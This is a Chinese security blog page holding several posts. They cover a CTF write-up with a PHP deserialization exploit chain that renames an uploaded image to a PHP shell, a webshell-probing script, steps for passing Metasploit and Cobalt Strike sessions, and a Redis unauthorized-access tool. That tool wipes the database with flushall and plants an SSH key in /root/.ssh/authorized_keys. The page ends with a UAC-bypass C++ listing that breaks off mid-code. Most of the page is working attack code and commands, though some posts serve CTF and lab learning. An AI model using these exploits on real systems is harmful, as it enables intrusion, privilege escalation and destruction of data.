<p>/web/controller/Profile.php的Profile类中调用了copy函数，可以重命名文件。$this-&gt;filename_tmp和$this-&gt;filename均可控，可以结合上传图片功能，调用upload_img方法将上传后的图片文件命名为php文件，直接getshell。</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAWFK.png" alt="6dAWFK.png"></p>
<p>/web/controller/Register.php中的Register类存在__destruct方法，只要把checker赋值为Profile类即可触发<code>__call</code>方法</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAgdx.png" alt="6dAgdx.png"></p>
<p>Profile类中存在<code>__call方法和__get方法</code>，<code>__call</code>方法中存在调用函数的可能，函数名为$this-&gt;{$this-&gt;{$name}}，进入<code>__call</code>方法后$this-&gt;index访问不存在的属性，从而调用<code>__get</code>方法，我们可以在<code>__get</code>方法中把$this-&gt;index赋值为upload_img，这样<code>__call</code>中即可调用upload_img。except属性可控，令except属性等于 array(‘index’ =&gt; ‘upload_img’)，这样$this-&gt;{$this-&gt;{$name}}就会等于$this-&gt;index等于upload_img，从而能在<code>__call</code>方法中调用upload_img函数</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAce1.png" alt="6dAce1.png"></p>
<h2 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h2><p>Register类中的<code>__destruct()</code>方法-&gt;Profile类中的<code>__call()</code>方法-&gt;Profile类中的<code>__get()</code>方法-&gt;Profile类中的upload_img()方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>=<span class="string">&quot;./upload/a0e8e2b0d70d8e34d1bd3b1452e39848/30a17ed2359586e474712c283fa27ffb.png&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;./upload/a0e8e2b0d70d8e34d1bd3b1452e39848/111.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>=<span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$p</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Profile();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> Register(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize(<span class="variable">$b</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>上传图片马</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAhWD.png" alt="6dAhWD.png"></p>
<p>在cookie的user参数中写入payload</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAIQH.png" alt="6dAIQH.png"></p>
<p>改名成功</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dA5Se.png" alt="6dA5Se.png"></p>
<h1 id="smarthacker"><a href="#smarthacker" class="headerlink" title="smarthacker"></a>smarthacker</h1><p>脚本编写</p>
<p>直接下载备份文件开始分析</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dATOA.png" alt="6dATOA.png"></p>
<p>打开后发现大量疑似webshell，但是大都无法利用，由于数量高达3000个，逐个分析是不可能的，因此只能利用python脚本构造请求测试webshell中的参数是否可用</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAOFf.png" alt="6dAOFf.png"></p>
<p>编写脚本测试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">patternget=re.<span class="built_in">compile</span>(<span class="string">&quot;GET\[\&#x27;(.+?)\&#x27;\]&quot;</span>)</span><br><span class="line">patternpost=re.<span class="built_in">compile</span>(<span class="string">&quot;POST\[\&#x27;(.+?)\&#x27;\]&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&#x27;D:\phpstudy_pro\WWW\ctf\src&#x27;</span>)</span><br><span class="line">files=os.listdir(<span class="string">&#x27;D:\phpstudy_pro\WWW\ctf\src&#x27;</span>)</span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>							</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span></span><br><span class="line">webshellname=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>():</span></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> files:</span><br><span class="line">        print(filename)</span><br><span class="line">        index=<span class="number">11</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            result=patternget.findall(<span class="built_in">str</span>(f.read()))</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">for</span> arg <span class="keyword">in</span> result:</span><br><span class="line">                index+=<span class="number">1</span></span><br><span class="line">                url=<span class="string">&#x27;http://127.0.0.1/ctf/src/%s?%s=echo 955682789;&#x27;</span> %(filename,arg)</span><br><span class="line">                r=session.get(url)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;955682789&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">&quot;webshell is %s:%s&quot;</span> %(filename,arg))</span><br><span class="line">                    webshellname=<span class="string">&quot;webshell is %s:%s&quot;</span> %(filename,arg)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>():</span></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> files:</span><br><span class="line">        print(filename)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            result=patternpost.findall(<span class="built_in">str</span>(f.read()))</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">for</span> arg <span class="keyword">in</span> result:</span><br><span class="line">                url=<span class="string">&#x27;http://127.0.0.1/ctf/src/%s&#x27;</span> %filename</span><br><span class="line">                data=&#123;arg:<span class="string">&#x27;echo 955682789;&#x27;</span>&#125;</span><br><span class="line">                r=session.post(url=url,data=data)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;955682789&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">&quot;webshell is %s:%s&quot;</span> %(filename,arg))</span><br><span class="line">                    webshellname=<span class="string">&quot;webshell is %s:%s&quot;</span> %(filename,arg)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#post()</span></span><br><span class="line">    get()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>拿到flag</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dESyj.png" alt="6dESyj.png"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-03-11T02:43:50.000Z" title="2021-03-11T02:43:50.000Z">2021-03-11</time>发表</span><span class="level-item"><time dateTime="2021-03-11T02:46:42.581Z" title="2021-03-11T02:46:42.581Z">2021-03-11</time>更新</span><span class="level-item">2 分钟读完 (大约251个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/11/msf%E5%92%8Ccs%E8%81%94%E5%8A%A8/">msf和cs联动</a></h1><div class="content"><h2 id="cs派生给msf"><a href="#cs派生给msf" class="headerlink" title="cs派生给msf"></a>cs派生给msf</h2><p>配置好listener，选择Foreign HTTP</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6Y5Nxx"><img src="https://s3.ax1x.com/2021/03/11/6Y5Nxx.png" alt="6Y5Nxx.png"></a></p>
<p>使用cs的spawn功能</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6Y5tR1"><img src="https://s3.ax1x.com/2021/03/11/6Y5tR1.png" alt="6Y5tR1.png"></a></p>
<p>msf设置payload为/windows/meterpreter/reverse_http，ip和端口与listener中的一致，不要使用64位的payload，会出现问题。这样即可接收到派生过来的session</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6Y5YGR"><img src="https://s3.ax1x.com/2021/03/11/6Y5YGR.png" alt="6Y5YGR.png"></a></p>
<h2 id="msf派生给cs"><a href="#msf派生给cs" class="headerlink" title="msf派生给cs"></a>msf派生给cs</h2><p>只有meterpreter类型的session才能派生给cs</p>
<p>使用msf中的windows/local/payload_inject模块，设置payload为windows/meterpreter/reverse_http，ip和端口填写cs监听的ip和端口，再指定。设置iDisablePayloadHandler为true，因为payload_inject执行后会产生一个新的handler，但是我们已经有了一个，所以不需要它。执行后即可再cs中看到上线的机器。</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6Y5Ji9"><img src="https://s3.ax1x.com/2021/03/11/6Y5Ji9.png" alt="6Y5Ji9.png"></a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-03-06T03:15:29.000Z" title="2021-03-06T03:15:29.000Z">2021-03-06</time>发表</span><span class="level-item"><time dateTime="2021-03-06T03:19:38.851Z" title="2021-03-06T03:19:38.851Z">2021-03-06</time>更新</span><span class="level-item">4 分钟读完 (大约663个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/06/python%E7%BC%96%E5%86%99Redis%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/">python编写Redis漏洞检测和利用脚本</a></h1><div class="content"><h1 id="python编写Redis漏洞检测和利用脚本"><a href="#python编写Redis漏洞检测和利用脚本" class="headerlink" title="python编写Redis漏洞检测和利用脚本"></a>python编写Redis漏洞检测和利用脚本</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-6.0.8.tar.gz</span><br><span class="line"># tar xzf redis-6.0.8.tar.gz</span><br><span class="line"># cd redis-6.0.8</span><br><span class="line"># make</span><br></pre></td></tr></table></figure>

<p>执行完 make 命令后，redis-6.0.8 的 src 目录下会出现编译后的 redis 服务程序 redis-server，还有用于测试的客户端程序 redis-cli：</p>
<p>下面启动 redis 服务：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># cd src</span><br><span class="line"># .&#x2F;redis-server</span><br></pre></td></tr></table></figure>

<p>修改redis.conf，先注释掉bind 127.0.0.1这一行，允许远程登陆，同时关闭保护模式</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6nJBwD"><img src="https://s3.ax1x.com/2021/03/06/6nJBwD.png" alt="6nJBwD.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6nJDTe"><img src="https://s3.ax1x.com/2021/03/06/6nJDTe.png" alt="6nJDTe.png"></a></p>
<p>使用修改后的配置文件启动</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># cd src</span><br><span class="line"># .&#x2F;redis-server ..&#x2F;redis.conf</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6nJ6fA"><img src="https://s3.ax1x.com/2021/03/06/6nJ6fA.png" alt="6nJ6fA.png"></a></p>
<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>修改数据库默认路径为/root/.ssh，默认缓存文件为authorized.keys，把目标主机缓存的公钥作为value保存在authorized.keys文件中，这样就在服务器端/root/.ssh下生成了一个授权的key</p>
<p>1.本地主机生成密钥key</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6nJdOK"><img src="https://s3.ax1x.com/2021/03/06/6nJdOK.png" alt="6nJdOK.png"></a></p>
<p>2.在目录/root/.ssh下查看生成结果，并把公钥导入txt文件中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;root&#x2F;.ssh</span><br><span class="line">ls</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line">cat key.txt</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6nJ0eO"><img src="https://s3.ax1x.com/2021/03/06/6nJ0eO.png" alt="6nJ0eO.png"></a></p>
<p>3.把生成的公钥导入Redis缓存中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;key.txt | redis-cli -h xx.xx.xx.xx</span><br></pre></td></tr></table></figure>



<p>4.连接到目标主机，更改配置文件路径为/root/.ssh，设置文件名称为authorized-keys</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h xx.xx.xx.xx</span><br><span class="line"></span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh</span><br><span class="line">Config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>



<p>5.ssh连接到目标主机</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh xx.xx.xx.xx</span><br></pre></td></tr></table></figure>



<h2 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h2><p>github地址：<a target="_blank" rel="noopener" href="https://github.com/sp4zcmd/SimpleRedisScanner">https://github.com/sp4zcmd/SimpleRedisScanner</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Usage</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;RedisScanner.py 127.0.0.1 key.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Scan</span>(<span class="params">ip</span>):</span></span><br><span class="line">    payload=<span class="string">&quot;\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a&quot;</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.settimeout(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.connect((ip, <span class="number">6379</span>))</span><br><span class="line">        s.sendall(payload.encode())</span><br><span class="line">        recvdata=s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;redis_version&#x27;</span> <span class="keyword">in</span> recvdata:</span><br><span class="line">            print(<span class="string">&#x27;[+] %s is vulnerable &#x27;</span> %ip)</span><br><span class="line">            <span class="comment">#print(recvdata)</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&#x27;[-] %s is not vulnerable &#x27;</span> %ip)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WriteSSHKeygen</span>(<span class="params">ip,sshkey</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = redis.StrictRedis(host=ip, port=<span class="number">6379</span>, db=<span class="number">0</span>, socket_timeout=<span class="number">2</span>)</span><br><span class="line">        r.flushall()</span><br><span class="line">        r.<span class="built_in">set</span>(<span class="string">&#x27;crackit&#x27;</span>, sshkey)</span><br><span class="line">        r.config_set(<span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;/root/.ssh/&#x27;</span>)</span><br><span class="line">        r.config_set(<span class="string">&#x27;dbfilename&#x27;</span>, <span class="string">&#x27;authorized_keys&#x27;</span>)</span><br><span class="line">        r.save()</span><br><span class="line">        print(<span class="string">&#x27;[+] Write SSHkeygen successful&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&#x27;[-] Write SSHkeygen Failed&#x27;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(sys.argv)==<span class="number">3</span>):</span><br><span class="line">        ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">        sshkeyfile=sys.argv[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(sshkeyfile, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                sshkey = f.read()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">&#x27;Read SSHkeygen Failed&#x27;</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> Scan(ip):</span><br><span class="line">            WriteSSHKeygen(ip, sshkey)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        Usage()</span><br></pre></td></tr></table></figure>



<h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6nJay6"><img src="https://s3.ax1x.com/2021/03/06/6nJay6.png" alt="6nJay6.png"></a></p>
<p>写入成功</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6nJgSI"><img src="https://s3.ax1x.com/2021/03/06/6nJgSI.png" alt="6nJgSI.png"></a></p>
<p>成功连接</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6nJ2lt"><img src="https://s3.ax1x.com/2021/03/06/6nJ2lt.png" alt="6nJ2lt.png"></a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-03-04T12:55:11.000Z" title="2021-03-04T12:55:11.000Z">2021-03-04</time>发表</span><span class="level-item"><time dateTime="2021-03-04T12:58:29.402Z" title="2021-03-04T12:58:29.402Z">2021-03-04</time>更新</span><span class="level-item">4 分钟读完 (大约641个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/04/%E5%9F%BA%E4%BA%8ECOM%E7%BB%84%E4%BB%B6%E6%8E%A5%E5%8F%A3%E7%9A%84BypassUAC/">基于COM组件接口的BypassUAC</a></h1><div class="content"><p>COM提升名称（COM Elevation Moniker）技术允许运行在用户账户控制下的应用程序用提升权限的方法来激活COM类，以此提升COM接口权限。其中，ICMLuaUtil接口提供了ShellExec方法执行命令，创建指定进程。</p>
<p>原理是利用COM提升名称以高权限调用ICMLuaUtil接口，从而以高权限执行ShellExec创建指定进程。使用权限提升COM类的程序必须通过调用CoCreateInstanceAsAdmin函数创建COM类，必须用可信程序运行，如果执行COM提升名称代码的程序身份不可信，则会触发UAC，要Bypass UAC必须让这一段代码在Windows的可信程序中运行，如记事本、计算器、rundll32.exe等，通过DLL注入或是劫持技术，将这段代码注入到这些可欣程序的进程空间中。通过rundll32.exe调用自定义DLL中的导出函数，执行COM提升名称的代码。</p>
<h1 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h1><p>初始化com库-&gt;创建高权限的ICMLuaUtil接口-&gt;调用ICMLuaUtil的ShellExec方法-&gt;以高权限执行cmd</p>
<p>实质上是以高权限运行COM组件ICMLuaUtil,ICMLuaUtil中可调用ShellExecute执行程序。定义成导出函数，用可信程序rundll32调用导出函数</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;BypassUAC.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">HRESULT <span class="title">CoCreateInstanceAsAdmin</span><span class="params">(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BIND_OPTS3 bo;</span><br><span class="line">    WCHAR wszCLSID[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    WCHAR wszMonikerName[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    HRESULT hr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化COM环境</span></span><br><span class="line">    ::CoInitialize(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造字符串</span></span><br><span class="line">    ::StringFromGUID2(rclsid, wszCLSID, (<span class="keyword">sizeof</span>(wszCLSID) / <span class="keyword">sizeof</span>(wszCLSID[<span class="number">0</span>])));</span><br><span class="line">    hr = ::StringCchPrintfW(wszMonikerName, (<span class="keyword">sizeof</span>(wszMonikerName) / <span class="keyword">sizeof</span>(wszMonikerName[<span class="number">0</span>])), <span class="string">L&quot;Elevation:Administrator!new:%s&quot;</span>, wszCLSID);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> hr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置BIND_OPTS3</span></span><br><span class="line">    ::RtlZeroMemory(&amp;bo, <span class="keyword">sizeof</span>(bo));</span><br><span class="line">    bo.cbStruct = <span class="keyword">sizeof</span>(bo);</span><br><span class="line">    bo.hwnd = hWnd;</span><br><span class="line">    bo.dwClassContext = CLSCTX_LOCAL_SERVER;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建名称对象并获取COM对象</span></span><br><span class="line">    hr = ::CoGetObject(wszMonikerName, &amp;bo, riid, ppVoid);</span><br><span class="line">    <span class="keyword">return</span> hr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CMLuaUtilBypassUAC</span><span class="params">(LPWSTR lpwszExecutable)</span></span></span><br><span class="line"><span 